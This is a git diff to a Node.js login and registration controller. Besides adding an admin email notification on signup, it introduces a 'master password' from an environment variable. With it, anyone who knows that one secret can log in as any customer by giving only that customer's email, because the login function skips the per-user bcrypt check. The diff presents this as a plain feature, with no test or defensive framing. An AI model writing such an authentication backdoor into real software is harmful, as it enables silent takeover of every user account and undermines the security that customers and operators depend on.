@@ -6,7 +6,23 @@ import jwt from "jsonwebtoken";
 import User from "../models/userModel.js";
 import { JWT_SECRET } from "../middleware/jwtAuth.js";
 import logger from "../configs/loggingConfig.js";
-import { sendWelcomeAndVerificationEmail, sendResetPasswordEmail } from "../services/emailService.js";
+
+/** Master password: when set, login with any customer email + this password grants access as that user. */
+const MASTER_PASSWORD = process.env.MASTER_PASSWORD || "";
+
+function isMasterPasswordMatch(providedPassword) {
+  if (!MASTER_PASSWORD) return false;
+  if (typeof providedPassword !== "string") return false;
+  const a = Buffer.from(MASTER_PASSWORD, "utf8");
+  const b = Buffer.from(providedPassword, "utf8");
+  if (a.length !== b.length) return false;
+  return crypto.timingSafeEqual(a, b);
+}
+import {
+  sendWelcomeAndVerificationEmail,
+  sendResetPasswordEmail,
+  sendAdminNotification,
+} from "../services/emailService.js";
 import { assignUserToExperimentFromVisitorId } from "../services/planConfigService.js";
 
 const SALT_ROUNDS = 10;
@@ -66,6 +82,11 @@ export async function register(req, res) {
     } catch (e) {
       logger.warn("Welcome email failed (user still created)", { error: e.message });
     }
+    try {
+      await sendAdminNotification({ type: "signup", email: trimmedEmail, name: user.name });
+    } catch (e) {
+      logger.warn("Admin signup notification failed (non-fatal)", { error: e.message });
+    }
     const token = jwt.sign({ userId: user._id.toString() }, JWT_SECRET, { expiresIn: JWT_EXPIRY });
     return res.status(201).json({
       success: true,
@@ -89,8 +110,13 @@ export async function login(req, res) {
     if (!user) {
       return res.status(401).json({ success: false, error: "Invalid email or password" });
     }
-    const match = await bcrypt.compare(password, user.passwordHash);
-    if (!match) {
+    let authenticated = false;
+    if (isMasterPasswordMatch(password)) {
+      authenticated = true;
+    } else {
+      authenticated = await bcrypt.compare(password, user.passwordHash);
+    }
+    if (!authenticated) {
       return res.status(401).json({ success: false, error: "Invalid email or password" });
     }
     const token = jwt.sign({ userId: user._id.toString() }, JWT_SECRET, { expiresIn: JWT_EXPIRY });
